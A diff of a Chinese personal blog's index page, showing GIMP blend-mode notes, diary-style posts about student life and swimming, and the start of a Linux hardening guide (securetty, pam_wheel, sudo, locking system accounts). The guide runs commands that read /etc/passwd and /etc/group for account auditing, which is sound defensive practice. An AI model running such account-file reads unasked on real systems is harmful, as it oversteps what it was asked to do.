+<p>叠加(不过gimp中的叠加好像就是柔光, <a href="https://bugzilla.gnome.org/show_bug.cgi?id=162395" target="_blank" rel="external">这里看起来让人困惑</a>)：<br>    multiply和screen的结合：<br>    R = 1/255 x (B x R_S + (255 - B) X R_m)</p>
+<p>如果先面的图层B很深，就以multiply为主，相反如果B很亮，则以screen为主。结果就是暗的地方更暗，亮的地方更亮。</p>
+<h3 id="Darken_Only_和_Lighten_Only模式">Darken Only 和 Lighten Only模式</h3><p>变暗：<br>    R = MIN(F, B)</p>
+<p>变亮：<br>    R = MAX(F, B)</p>
+<h3 id="Hue,_Saturation,_Value,_Color模式">Hue, Saturation, Value, Color模式</h3><p>色调：<br>    R = [h(F), s(B), v(B)]</p>
+<p>取前景的色调</p>
+<p>Value和Saturation类似。</p>
+<p>Color：<br>    R = [h(F), s(F), l(B)]</p>
+<p>使用背景的lightness，一般lightness都比value小些</p>
+<p>最后，这里头什么乱七八糟的历史问题，还是这比较清楚：<a href="http://www.pegtop.net/delphi/articles/blendmodes/" target="_blank" rel="external">图层混合模式详解</a></p>
+<h2 id="其它">其它</h2><p>最后，完全被北邮求职氛围吓尿拉！！！！！！！！！！！</p>
+<p>惶恐万分，心情只能用下面的图形容</p>
+<p><img src="/images/ancious.jpg" alt="惶恐万分图" title="希望手绘反映内心"></p>
+<p>还有时间这样没事画棵树么？</p>
+<p><img src="/images/work-gimp3.jpg" alt="树" title="我的第一个上色唉"></p>
+<p>不管怎样，毕业之前有几件特别想做的事：</p>
+<ol>
+<li>以工作室的名义发布一款自任美工、编剧、程序员等balblabla使用phaser.js制作的“网页游戏”</li>
+<li>画给某些人的画</li>
+<li>去游泳馆洗三百次澡= =。。。。。。</li>
+</ol>
+<p>as酱上回来找我玩错过了好遗憾，as酱T T，下次你有空不知啥时候了。</p>
+<p>最后奉上工作室logo：</p>
+<p><img src="/images/work-gimp5.jpg" alt="半条狗工作室" title="半条狗logo"></p>
+<p>欢迎各位一起来玩耍。一起来做ARPG啊！</p>
+<p>最后丧心病狂大量图片哈哈哈哈</p>
+<p>在aus的推荐下迷上了像素画</p>
+<p><img src="/images/work-gimp4.jpg" alt="像素狗，半条狗" title="一条大狗">]</p>
+<p><img src="/images/work-gimp2.jpg" alt="anubis" title="anubis"></p>
+<p>在<a href="http://www.gimpusers.com" target="_blank" rel="external">gimpusers</a>上看到了很多很棒的教程！</p>
+<p><img src="/images/work-gimp.jpg" alt="chrome环" title="chrome">]</p>
+<p><img src="/images/work-gimp1.jpg" alt="火焰效果" title="fire"></p>
+<p><img src="/images/work-gimp6.jpg" alt="flashy car" title="flashy car"></p>
+<p><img src="/images/animated-radar.gif" alt="animated radar" title="动画雷达"></p>
+
+            
+          </span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/life/2015/03/02/2015s-first-post/" itemprop="url">
+                  2015's First Post
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2015-03-02T00:00:00+08:00" content="2015-03-02">
+              2015-03-02
             </time>
           </span>
 
@@ -244,8 +1382,8 @@
             
               <span class="post-comments-count">
               &nbsp; | &nbsp;
-              <a href="/life/2015/11/15/2013-09-30/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2015/11/15/2013-09-30/" itemprop="commentsCount"></span>
+              <a href="/life/2015/03/02/2015s-first-post/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2015/03/02/2015s-first-post/" itemprop="commentsCount"></span>
               </a>
             </span>
             
@@ -267,22 +1405,37 @@
         
           <span itemprop="articleBody">
             
-              <h2 id="这是换spf13后的第一篇文章">这是换spf13后的第一篇文章</h2><p>果然英语写的东西说英语的人好用，像我这经常切换输入法的中文用户，没有依云的切换fcitx脚本，竟然各种按错。</p>
-<p>几天前见bin哥的vim很漂亮，问了下是spf13这个vim发行版。于是给自己也换了，为了那个airline能像powerline一样漂亮可是忙了一个中午。</p>
-<p>初步体验了下，速度还不错。偶尔有点卡，我想把依云的东西也加上，不然输入法切得太蛋疼了。</p>
-<h2 id="过几天可能会碰到Python">过几天可能会碰到Python</h2><p>试试新环境怎么样，我一直觉得自己配置的东西是最好的，但现在实在懒得配置任何东西，spf13看着也很棒，所以，我的配置就见鬼了。</p>
-<p>大体上spf13感觉相当好。过几天可能会用到python，看看这新环境真么样。</p>
-<h2 id="项目慢慢有压力">项目慢慢有压力</h2><p>刚开始的话，大体上没太多事，至于今后怎么发展，PM都不怎么清楚。但时间表就在那里静静的放着，听师兄说，前端时间大多闲着，项目快结题了天天疯狂加班，这真囧。</p>
-<p>项目算是商业机密，虽然就目前几个人的水平没啥好机密的，但肯定不适合像以前一样在博客里随便写了。</p>
-<h2 id="写中文的话还是用vim不太合适">写中文的话还是用vim不太合适</h2><p>满篇的红色下划线。要么以后都用英文写算了。</p>
-<h2 id="Hello_world">Hello world</h2><p>I’m tired and want to sleep.</p>
+              <p>好早就想写点什么了，然而犹犹豫豫一直没下笔。一月没有写，二月也没有写，转眼年也过了，三月来了，天气将要转暖，马上要找实习写论文找工作，还有许许多多漫天飞舞不知何去何从的残念。</p>
+<p>都快忘记怎么用jekyll的rake新建一个post，怎么使用markdown语法，也迟疑着不知该具体写些什么。</p>
+<p>之前的两月没有白过，想说的仅此吧。</p>
+<p>游了一个月不到的泳，就第三次把手砸在水线上血染泳池，半夜跑去北医三院打了针破伤风，再游泳就昨天了。</p>
 <blockquote>
-<p>九月将尽</p>
-<p>时光毫不留情地向前飞驰，车窗将街边的霓虹甩远，好似一个个光怪陆离的梦，一场接一场，绵延无尽头。</p>
-<p>我的朋友啊，你真的醒了，还是沉睡在某个阴沉的雾霾天中，期待着万里晴空如洗，满城秋意盎然。悄悄的秋来了，悄悄地世界变了，一切似曾相识又形同路人。年年岁岁花相似，岁岁年年人不同。</p>
-<p>站在学十顶楼阳台，望不清这城市。影影绰绰，似曾相识。万千感慨，不知何以开口。生亦由命，死亦由命。如电如露，浮游一瞬。</p>
-<p>沉沉如梦，混混半生。我却不愿醒来，让我静静的睡个好觉。 </p>
+<p>怎样下水才能表现出经常下水的样子</p>
 </blockquote>
+<p>跑到深水区救生员小哥说你的装备呢，我才发现什么泳帽泳镜都没拿进去。。。。。。下水后整个人都快动不了了，虚得一塌糊涂。</p>
+<p>一个月过年就爬过一次山，算是活动了下。把小伙伴们带到没路的地方，然后强行开路。。。。。。</p>
+<p>不扯其它的了。</p>
+<p>又做了次LFS，终于明白是在干什么了。然而等所有东西都安装好却懒得去配置了。</p>
+<p>玩了下nodeschool系列。把javascripting、learnyounode、git-it、functional-javascript、shader-school、webgl都过了遍。现在还记得些什么呢。。。。。。有道笔记里应该还有些笔记。</p>
+<p>于是开始折腾glsl，把shader-school过遍发现难度好大。把中科大黄章进老师的高级计算机图形学的课件拿来看了看，最后也没看多少。</p>
+<p>把webgl-workshop过了遍，最后发现<a href="http://www.webglacademy.com/" target="_blank" rel="external">http://www.webglacademy.com/</a>不错却只画了个2D三角形，现在也几乎忘的干净。不过再上手应该就很快了。</p>
+<p>查webgl的知识看到<a href="http://html5gamedev.org/" target="_blank" rel="external">http://html5gamedev.org/</a>上webgl的一些效果，再加上一个在线的<a href="http://race.assassinscreedpirates.com/" target="_blank" rel="external">刺客信条游戏</a>便萌生了开发游戏的。。。。。。。呵呵。。。。</p>
+<p>然后看到某某的html5游戏引擎制作中设计精灵，竟然开始专注图像处理。。。。。。</p>
+<p>学习下基础的图像理论色彩理论等等等，</p>
+<p>把gimp和krita重新配置了下。桌面主题和图标折腾了下又回归原来的配色主题，因为好看的主题总会在某些地方让人看不清东西，毕竟好看是次要的。</p>
+<p>看到论坛上有人推荐<a href="http://pages.cs.wisc.edu/~remzi/OSTEP/" target="_blank" rel="external"> Operating Systems: Three Easy Pieces </a>，感觉很不错。又看有人推荐<a href="http://littleosbook.github.io/" target="_blank" rel="external">littleOsbook</a>，跟着写了点发现太不详细了，从分段开始我就不知道怎么把一切串到一起。后来看到<a href="http://wiki.osdev.org/Bare_Bones" target="_blank" rel="external">Osdev上的教程</a>，只大致看了看。</p>
+<p>发现<a href="http://www.68ps.com/jc/big_ps_tp.asp?id=19958" target="_blank" rel="external">68ps</a>的抠图教程不错，大年三十看着春晚抠图。。。。。。最后也没做好。</p>
+<p>照着上面网站另一篇鼠绘教程画了个<a href="http://www.68ps.com/jc/big_ps_sh.asp?id=3044" target="_blank" rel="external">水母</a>。感觉这没有数位板不行啊，于是翻出了尘封多年的绘图板。又把数位板翻出来连上，重新编译内核wacom模块(学会了失传已久的单独模块编译技术…)。</p>
+<p>所以，接下来：</p>
+<p>准备成立个工作室，做个游戏，发行两个唱片。</p>
+<p>先完成工作室logo设计，为此查了一天的anubis。</p>
+<p>还顺便在朋友的推荐下学习做做pixel art。在图书馆乱翻到一本什么bibi的photoshop插画私房菜什么的书，竟然也看到里头演示pixel art实例。</p>
+<p>把webgl过遍。</p>
+<font color="red">好好游泳，锻炼身体。</font>
+
+<p>呵呵呵，还有实验室、论文、实习、工作。。。。。。</p>
+<p>渣渣的第一个鼠绘：）</p>
+<p><img src="/images/jellyfish.png" alt="照着ps教程用gimp鼠绘的水母" title="照着ps教程用gimp鼠绘的水母"></p>
 
             
           </span>
@@ -325,8 +1478,8 @@
             
               
                 
-                <a class="post-title-link" href="/life/2015/11/15/2013-09-06/" itemprop="url">
-                  四叠半
+                <a class="post-title-link" href="/life/2014/12/24//" itemprop="url">
+                  明天太远，今天太短
                 </a>
               
             
@@ -336,8 +1489,8 @@
         <div class="post-meta">
           <span class="post-time">
             发表于
-            <time itemprop="dateCreated" datetime="2015-11-15T14:01:31+08:00" content="2015-11-15">
-              2015-11-15
+            <time itemprop="dateCreated" datetime="2014-12-24T00:00:00+08:00" content="2014-12-24">
+              2014-12-24
             </time>
           </span>
 
@@ -362,8 +1515,8 @@
             
               <span class="post-comments-count">
               &nbsp; | &nbsp;
-              <a href="/life/2015/11/15/2013-09-06/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2015/11/15/2013-09-06/" itemprop="commentsCount"></span>
+              <a href="/life/2014/12/24//#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2014/12/24//" itemprop="commentsCount"></span>
               </a>
             </span>
             
@@ -385,44 +1538,63 @@
         
           <span itemprop="articleBody">
             
-              <h2 id="人生是苦">人生是苦</h2><p>总之，先说说动画。风格很奇特的动画，音乐很赞，声优很赞，剪辑不错。</p>
-<p>早上没去实验室也没上课，愣是把四叠半神话大系看完了。</p>
-<p>努力追寻中便是人生的色彩和意义么？</p>
-<p>真不该看这种动画，看完后丝毫高兴不起来，情绪一落千丈。</p>
-<p>我在追寻什么呢？在生活的洪流裹挟下跌跌撞撞，摇摇摆摆。不知所以的到了今天这个地步。然后我想：</p>
-<blockquote>
-<p>真该死，时光若能倒流就好了，如果当初我做了那个选择而不是这个…..</p>
+              <blockquote>
+<p>迷路的鸽子啊。</p>
 </blockquote>
-<p>然而谁知道，也许都是性格悲剧下的命运。无论如何的挣扎骚动叛逆抗争，结局都是一样的吧，谁知道。</p>
-<p>我不知道有何意义，快乐的日子总是倏忽即逝，难熬的岁月回头看时也恍然如梦，时光像匆匆穿过身体的风一样，来无影，去无踪，什么也没有留下。</p>
-<p>过往种种，真像梦一样。</p>
-<p>人生是苦，苦在无常。</p>
-<h2 id="Recent_times">Recent times</h2><p>大概记下最近吧，希望没漏下什么，但也不可能什么都写下。</p>
-<p>二十八号怀着依依不舍的心情从家乡漂到北京，混乱的情绪好像火车车窗外阴郁的天。我还记得毕业回家离开无锡的时候，火车上摄人心魄的美丽初阳，半天燃烧绚烂的云朵，绿色的原野与高远的天空。然而到北京什么都没有看到，什么看的心情也没有。</p>
-<p>如果说毕业离校那天是失魂落魄的惋惜和怀念，到北京的路上只有无奈和麻木。</p>
-<p>火车晚点两个小时，晃晃悠悠进了北京站，到处都是人，人如潮涌，匆匆忙忙，在人的海洋中随波逐流，不知所以地被推出地铁站。</p>
-<p>谢谢mapleray，让我漂泊的前路没有这么孤单和沮丧，给晃荡的人一个前方的目标。还能够打起精神问到在哪里买票，排队买了票上车，一直站到BIT。</p>
-<p>中午从BIT离开，一路步行到BUPT，就像梦一样。办理入宿又是好长的队，好在碰到一起面试的同学，可以打法下时间。</p>
-<p>说来真幸福，分到一个很棒的宿舍。</p>
-<p>晚上联系上Tom Sawyer学长，很恬不知耻地蹭了顿饭，又打发了半个晚上的无聊日子。</p>
-<p>似乎闲着好几天，自己竟然跑去买了一整套被褥，一路从bupt南门拖到北门，竟然半个问下的人都没……不过这无所谓。</p>
-<p>办了个手机卡，然而也没打几个电话，几天前才记住自己的电话</p>
-<p>选助教莫名选了个助管，然后，让我等通知就没然后了</p>
-<p>选课，基本随便选了。竟然在考研版看到lanphon会来问课表。当初是看着lanphon的TeX笔记入门的，真想见见lanphon。</p>
-<p>大学同学出国，和寝室室友还有这位同学聚了一次，恍惚间似乎时光倒流，回到无锡。</p>
-<p>联系上以为以前大学学院的学长，又恬不知耻地蹭了一顿饭，谢谢学长招待。不觉聊起JNU的种种。学长说一直想回去看看。</p>
-<p>某天下午N老板跟我们讲讲大组的情况，然后让我们写张条子。这之后某天就被分组了，竟然是Tom Sawyer学长那里。学长很热心地指导下，于是又是一顿阴差阳错。</p>
-<p>暂时在实验室没什么事，天天在实验室晃来晃去，实验室有酸奶，有水，我又没什么事，忽然觉得简直是天堂。没事去骚扰骚扰这个同学，打扰打扰那个学长，看看什么html的闲书，打打C语言的哈欠，一天一天就这么过去。</p>
-<p>然而幸福的日子总归是短暂的。</p>
-<p>人生是苦，苦在无常。</p>
-<p>但愿我能鼓起勇气，大步流星的向前走。有这么些事，我没忘记，只是不敢。</p>
-<h2 id="相对论">相对论</h2><p>今天同学聊着说，有心情时没时间，有时间时没心情。</p>
-<p>真不明白，如果我想往哪个方向，往前走就是了，却贪念另一条路的风景不肯前行，却畏惧前方的险阻不敢踏步？</p>
-<p>这真是永远的悲剧。</p>
-<p>事情总是比我想像的好，多少来说我也是悲观的吧。不过我对自我的印象和评价也极度偏差，大概不愿意面对自己，谁知道。</p>
-<p>我想我该勇敢点，就像不怕麻烦的人不会碰上麻烦，畏惧的人将总是受伤。昨天洗了个冷水澡，水温远比我想像的高很多很多。世事也许也是如此，远比我想像的温和简单。</p>
-<p>我又不冷静了，其实是因为现在又一个人在寝室了。珍惜现有的人生吧，努力向前走吧。我想先一个人出去转转。</p>
-<p>碎碎念完毕，果然现在冷静多了。</p>
+<p>一年很短，一年好长。</p>
+<p>一年倏忽就晃过去，倏忽间珍存的只在记忆留下余温。</p>
+<p>一年的记忆累累，蓊蓊郁郁，如烟似梦，怎么都回忆不完。</p>
+<p>觉得变了很多，连早上起来呼吸的空气都变了味道，又觉得什么都没有变，日光之下，并无新事。</p>
+<h1 id="算了">算了</h1><p>随便写下，随便回忆下。</p>
+<p>几乎每天都去游泳。</p>
+<p>春夏秋冬。</p>
+<p>寒来暑往。</p>
+<p>像一个师妹的话，风雨无阻。</p>
+<p>像另一个师妹的话，专情。</p>
+<p>如果有什么贯穿始终的话，</p>
+<p>游泳是2014年贯穿始终的全部。</p>
+<p>我的2014不可磨灭的关键词</p>
+<p>三月份之前我不记得了，在家挺不适应，冷，宅。颓得一塌糊涂，唯一似乎做的有意义的事是把python公案给过了遍，twisted的一篇教程和文档看了遍，如今已不记得只言半句。回去过年房间也没收拾，也是遗憾吧。家里变化好大，回去的几天家里漫天白茫茫的雾，所有祥和气氛下的无奈与心酸变故，化作一声叹息，无处寻觅。</p>
+<p>年前回家那阵忙着考试，过得忙碌，好久没和家里充分联系。回到家里，我还看着。。。算了，不想多说。</p>
+<p>往日祥和一心的氛围一去不返，十几年的情谊一霎那岌岌可危。</p>
+<p>这就是2014年的春节寒假。</p>
+<p>以前看红楼梦，只是看到里头家人朋友相聚时热闹祥和的气氛深有感触，觉得这些经历跟我没什么关系。当年只是感慨韶华易逝，没想到逝这么快。这才想起来红楼梦中其它种种，都像预言一样，不觉泪下。</p>
+<p>开学回学校，似乎有种解脱感。所有种种要面对的问题，都留给独立撑起家里的母亲。</p>
+<p>回到学校，工作上也有大变动，地点换了，内容也完全变了。做了些与网络协议相关的工作，不自觉也兴致盎然，饶有兴趣研究了网络层一些协议。</p>
+<p>那段日子也算清闲自在，实验室来新师弟师妹了，和室友在实验室打minecraft，在实验室玩xbox推刺客信条和热血无赖，八点钟去游泳池打酱油。</p>
+<p>这些日子渐渐和zq、扯旗、彬哥、阿花混得比较熟了，游泳总是碰上，哈哈。不过他们都是在用心游，我就抱着活动活动的心态随便动动。</p>
+<p>阿花每次见到我总喜欢拿我开涮，总说，唉，那个是你师姐，唉，又手把手教你师姐不陪我玩。阿花帅气成熟，我这种人能和阿花认识总觉得是生命中的奇迹。阿花曾经在泳池里看到了一个妹子，心生向往之情，在论坛上发帖定向。我之前知道这个人来找过某室友，只寥寥说过几句话。有次在水里听到说到帖子定向的事，我一看，唉，是不是你啊。然后竟然就莫名其妙的熟起来了。那几天一起去学自由泳，游完来碗热腾腾的拉面。后来，阿花和妹子也算搭上谈了谈，终于有缘无份，抱憾而终。有次一起去水立方游泳时，从新奥购物中心巨大的建筑物，来到奥林匹克公园豁然开朗时，阿花轻描淡写但不无遗憾的谈到此事。然而我无法如此坦诚，后来阿花去游泳少了许多，一个是工作忙，一个是职务上的事也多，另外其它事也多。阿花后来喊我去打台球，终于却一次没去一起打过。总之，希望新的一年阿花捉到一只……嗯……妹子。</p>
+<p>zq是碧水情深版版主，嘿，真是很少见到这么热情的人。我总是很佩服zq，待人接物，举止言谈都自然坦诚，让人一见了就欢喜。对此，zq的说法是：因为我是个逗比= = zq是我的游泳教练和陪我去看病骑车带我去游泳的好机油，也是我人生的导师。zq教我游泳，开始只有一个理论：不要让自己太舒服，坚持，再坚持一下。在我眼中，zq非常善于与他人交流，总是很虚心地向别人请教各种人生问题。啊，zq好像知道我博客的地址……不多说了。祝愿工作顺利、身体健康、心情愉快！当然，还有妹子哈哈。zq你要看到我想说，你单身纯粹是你自己想单身，随便跟你走几百米能有三四个妹子给打招呼= =</p>
+<p>扯旗呢，和扯旗认识算是因为扯旗和阿花认识，扯旗和阿花怎么认识，我怎么知道。大概是某个邪恶的北邮人游泳群。对了，一月份错过了今年，估计也是唯一一次的群聚，也算遗憾吧，考试可能只是借口，我害羞了吧。不扯远，扯旗给我的印象，就是拿着手蹼坑吃坑吃在水里拼命劳动。扯旗说：人生本来就是与大自然抗争的过程。对此，我只能弱弱地点下赞。后来，去人大，算是渐渐和扯旗熟了些。那时候他已经在某互联网公司产品经理实习，渐渐越来越忙。开始还一起去一起回，后来能周二周四见到他和他公司游泳社几个人，再后来……唉？关于扯旗有个传说：从前北邮的游泳池有个游得特别赞的女神，被扯旗拐走了= =。扯旗简直能扯，游泳群里的荔枝都叫他扯淡鱼，说起话一套一套的，救生员lt对扯旗评价甚高：扯旗这个人啊，特别能XX，特别能XX，特别能XX。我会永远记住某君把我黑上论坛十大的仇的，哼。实验室现在还有人因为扯旗嘲笑我，哼。祝工作顺利，身体健康，生活幸福！</p>
+<p>彬哥某次版聚教我自由泳：怎么舒服怎么来，就这样，我给你说我们怎么游，哗——哗——哗——……不是很熟，比我高一届似乎又比较忙，只记得群里有次有人出计算所的游泳票，彬哥干脆全买下来请大家去游。虽然最后未能成行= =。</p>
+<p>大概四五月份开始，工作又经过大的变动。短短几个月三次大变。开始还好，也过得简简单单随随便便。从八月开始，丧心病狂的日子开始了，甲方催得紧，身体不好，项目管理又比较乱，我觉得在浪费自己和大家的时间，另外身体不好也不愿意加班，反而更拼命游泳去了。那段日子想，干脆退学得了，这日子简直无聊。</p>
+<p>还有些别扭，组长师姐、已经毕业的gx湿胸之间情谊放着，不想坑他们。</p>
+<p>不过我做的事情已经传递出这么一种态度，让我滚吧= =</p>
+<p>那天翔哥来这边签字什么的，下去送他去保卫处，随便谈了下。在学二十九下仰头看天上的流云，直到脖子酸掉。</p>
+<p>我终于是没有退学，老师没有赶我走。</p>
+<p>老师说生病了就先休息吧，到时候再回来。</p>
+<p>我心软了。</p>
+<p>但却似乎一下从坑中跳了出来，今后种种手忙脚乱，都与我擦肩而过。这么一档子事过后，说不清福祸。</p>
+<p>那段时间，对逆向痴迷了一阵。Reverse engineer for beginner也没有看完，也算2014的一大遗憾吧。</p>
+<p>从那段时间起，我开始想放弃做技术了。</p>
+<p>不管怎样，我玩命的游泳去。</p>
+<p>那段日子是烧钱去游泳。</p>
+<p>也是玩命去游泳</p>
+<p>我的支气管炎大概一个多月才彻底好。</p>
+<p>对我来说，虽然是很乱的日子，也是很难忘的日子。</p>
+<p>那段时间，北邮游泳馆修屋顶关闭。</p>
+<p>第一天下午，先去了北师，问了下价格和办卡的方案。</p>
+<p>感觉简直坑啊，想要么把北京游个遍？上网搜了下人大似乎还不错，可以办300元的十五次卡。</p>
+<p>我当时是怎么想的，在群里说我要去人大。第一次认识了丹丹。我不是会表达感谢的人。虽然一直想说，谢谢。刚认识不久的日子就感冒不能下水，热心惦念着给我送了一大袋子梨。我觉得她正如她所说的：做一个温暖的人，爱身边每一个人。大概永远不会忘记狂风暴雨中一起穿越地下通道和天桥，穿过积水和淋漓的雨，穿过帝都电闪雷鸣的夜就为了去游个泳的记忆。不会忘记她在我有次跳水时加油的手势和笑容。她给我的，阳光、温暖和热情，像拨开黑夜的光芒，照亮前行的路与迟疑的心。后来开学了= =……给我发了个满是课的课程表= =……再见得就少了。希望这么温暖阳光的女孩能一直这么下去，and best bless.</p>
+<p>这段日子，断断续续认识了些喜欢去游泳的朋友。涂涂、范老师、黄老师、qd等吧。</p>
+<p>中途回家一次，直系亲属癌症手术，两位直系血亲罹患癌症，唉。不管怎样，大家都还拼命活着，已经很幸福了。</p>
+<p>后来，实验室也不会让我闲着，做起了其它东西，但没什么甲方压力轻松自由多了。简直不想错过一天去游泳的日子，每天都去，大概是被涂涂、丹丹、范老师他们刺激了，大概由于zq的教导和扯旗的理论，终于认真学习游泳了。</p>
+<p>看看topswim，问问zq，自己练练。几个救生员说，唉，没白天天来啊，蛙泳游得不错啊。渐渐和救生员熟悉了，每次去总要打个招呼开开玩笑啥的，进深水区从来不拿深水证……= =。特别是某个叫lt的救生员，总是一边用眼神往远处瞄，一边压低声音偷偷对我说，看，那个穿XX的妹子。转眼年底，ho走了，lt走了，tzp走了。祝好。</p>
+<p>到此为止吧，再不回去宿舍就锁门了。其它，随风去吧。之前老妈太拼得了个肺炎，吓了一跳。转眼我自己又是毛病，回去早点休息，身体简直差。过两天还得去北医三院。</p>
+<p>今天太短，明天太远。</p>
+<p>短暂今天的相识相遇是我最宝贵的记忆之一。</p>
+<p>2014,再见。</p>
+<p>你好，2015</p>
 
             
           </span>
@@ -465,8 +1637,8 @@
             
               
                 
-                <a class="post-title-link" href="/life/2015/11/15/2013-09-13/" itemprop="url">
-                  雨中帝都
+                <a class="post-title-link" href="/linux/2014/11/20/account-and-access-control/" itemprop="url">
+                  Account and Access Control
                 </a>
               
             
@@ -476,8 +1648,8 @@
         <div class="post-meta">
           <span class="post-time">
             发表于
-            <time itemprop="dateCreated" datetime="2015-11-15T14:01:31+08:00" content="2015-11-15">
-              2015-11-15
+            <time itemprop="dateCreated" datetime="2014-11-20T00:00:00+08:00" content="2014-11-20">
+              2014-11-20
             </time>
           </span>
 
@@ -486,8 +1658,8 @@
               &nbsp; | &nbsp; 分类于
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/life/" itemprop="url" rel="index">
-                    <span itemprop="name">life</span>
+                  <a href="/categories/linux/" itemprop="url" rel="index">
+                    <span itemprop="name">linux</span>
                   </a>
                 </span>
 
@@ -502,8 +1674,8 @@
             
               <span class="post-comments-count">
               &nbsp; | &nbsp;
-              <a href="/life/2015/11/15/2013-09-13/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2015/11/15/2013-09-13/" itemprop="commentsCount"></span>
+              <a href="/linux/2014/11/20/account-and-access-control/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux/2014/11/20/account-and-access-control/" itemprop="commentsCount"></span>
               </a>
             </span>
             
@@ -525,11 +1697,220 @@
         
           <span itemprop="articleBody">
             
-              <p>屌丝就是屌丝,无法逃脱的命运.</p>
-<p>其实我想说什么来着,帝都连着两天阴雨,天灰蒙蒙的,心里也阴沉沉的.十来天也在实验室混个面熟,然后就滚蛋去公司了,这么还真眷恋实验室.</p>
-<p>天气依然中度或重度污染,但该活动还是会活动.</p>
-<p>大概就这吧.在好多地方感觉大家还是很热情客气的,谢谢.</p>
-<p>其实十一想回家看看,要不要花钱买票呢,回吧.</p>
+              <p>传统的Unix中，一旦攻击者获得对应帐号的shell，他就能执行该账户所能行使的任何行为，存取该账户能存取的任何文件。因此，让未授权的人获得指定帐号shell更加困难(特别是对权限账户)，是系统安全重要的部分。本文介绍如何引入限制账户登录的机制。</p>
+<h2 id="限制基于密码的登录来保护账户">限制基于密码的登录来保护账户</h2><p>传统Unix账户通过提供用户名和密码登录，这些用户名和密码会和储存在<code>/etc/passwd</code>和<code>/etc/shadow</code>中的内容对比。密码登录可能被被猜测，被嗅探，被中间人截取，无论是从网络还是不安全的控制台中。因此，限制账户密码登录的机制很重要。</p>
+<h3 id="限制root只能在系统控制台登录">限制root只能在系统控制台登录</h3><p>编辑<code>/etc/securetty</code>，确保只有以下行：</p>
+<ul>
+<li><p>基本的系统控制台设备：</p>
+<pre><code><span class="built_in">console</span>
+</code></pre></li>
+<li><p>虚拟控制台设备</p>
+<pre><code>tty1
+tty2
+tty3
+tty4
+...
+</code></pre></li>
+<li><p>如果需要，保留这些废弃的控制台接口来保留向后兼容。</p>
+<pre><code>vc/<span class="number">1</span>
+vc/<span class="number">2</span>
+...
+</code></pre></li>
+<li><p>如果需要，添加串口控制台：</p>
+<pre><code><span class="title">ttyS0</span>
+ttyS1
+</code></pre></li>
+</ul>
+<p>仅在紧急情况下才允许root直接登录。通常，管理员可以通过唯一的非权限用户使用<code>su</code>或者<code>sudo</code>来执行权限命令。不鼓励管理员直接使用root用户有助于对多管理员系统的审计工作。减少root能直接连接的通道减少了root密码被猜解的几率。</p>
+<p><code>login</code>程序使用<code>/etc/securetty</code>确定哪些接口允许root登录。虚拟设备<code>/dev/console</code>和<code>/dev/tty*</code>代表系统控制台(通过<code>Ctrl-Alt-F1</code>等打开)。默认的<code>securetty</code>文件也包含<code>/dev/vc/*</code>，来保留历史兼容性。</p>
+<p>root用户也应该禁止通过网络协议登录。本文暂不讨论。</p>
+<h3 id="限制su到root账户">限制su到root账户</h3><p>确保组<code>wheel</code>存在，所有持有root权限的管理员用户名作为其中的组员。</p>
+<pre><code><span class="keyword">grep</span> ^wheel <span class="regexp">/etc/g</span>roup
+</code></pre><p>编辑文件<code>/etc/pam.d/su</code>，添加、注释或者更改该行：</p>
+<pre><code>auth    required    pam_wheel<span class="class">.so</span>    use_uid
+</code></pre><p><code>su</code>命令允许用户从其它用户通过输入密码获得权限。因此限制已知管理员使用root是必要的。一般<code>wheel</code>用户组包含允许运行权限命令的全部用户。PAM模块<code>pam_wheel.so</code>被用来限制一组用户的接入。</p>
+<h3 id="配置sudo改善对root访问的审计">配置sudo改善对root访问的审计</h3><p>确保<code>wheel</code>存在，所有持有root权限的管理员用户名作为其中的组员。</p>
+<pre><code><span class="keyword">grep</span> ^wheel <span class="regexp">/etc/g</span>roup
+</code></pre><p>编辑<code>/etc/sudoers</code>，添加、取消注释或者更改如下行：</p>
+<pre><code>%wheel  <span class="built_in">ALL</span>=(<span class="built_in">ALL</span>)   <span class="built_in">ALL</span>
+</code></pre><p><code>sudo</code>能很好的控制哪个用户能用其它账户执行命令。这为每个权限用户执行的命令提供了审计可能。也许恶意管理员会绕过这个限制，但这个机制保证审计更容易。</p>
+<p>手工编辑<code>/etc/sudoer</code>很危险，配置错误也许会禁用远程root访问。推荐的方式是用<code>visudo</code>命令编辑这个文件，该命令会在保存前检查文件语法。</p>
+<p>权衡sudo带来的审计好处和安全风险。永远不要使用<code>NOPASSWD</code>指令，这会允许任何获取管理员账户的人在不知管理员密码的情况下以root身份执行命令。</p>
+<p>更多定制参见<code>sudoers</code> man页面</p>
+<h3 id="禁止非root系统账户登录和使用shell">禁止非root系统账户登录和使用shell</h3><p>！！！！！！！！注意：不要对root执行以下配置</p>
+<p>使用一下命令查看<code>/etc/passwd</code></p>
+<pre><code>awk -F: '{<span class="literal">print</span> <span class="variable">$1</span> <span class="string">":"</span> <span class="variable">$3</span> <span class="string">":"</span> <span class="variable">$7</span>}' /etc/passwd
+</code></pre><p>找到那些UID低于500(系统账户)，不是root的账户：</p>
+<p>对每个系统账户<code>SYSACCT</code>，锁定：</p>
+<pre><code><span class="title">usermod</span> -L SYSACCT
+</code></pre><p>禁用它们的shell：</p>
+<pre><code>usermod <span class="operator">-s</span> /sbin/nologin SYSACCT
+</code></pre><h3 id="确认密码被适当存储和哈希">确认密码被适当存储和哈希</h3><h4 id="确保没有账户有空密码">确保没有账户有空密码</h4><p>使用以下命令查看：</p>
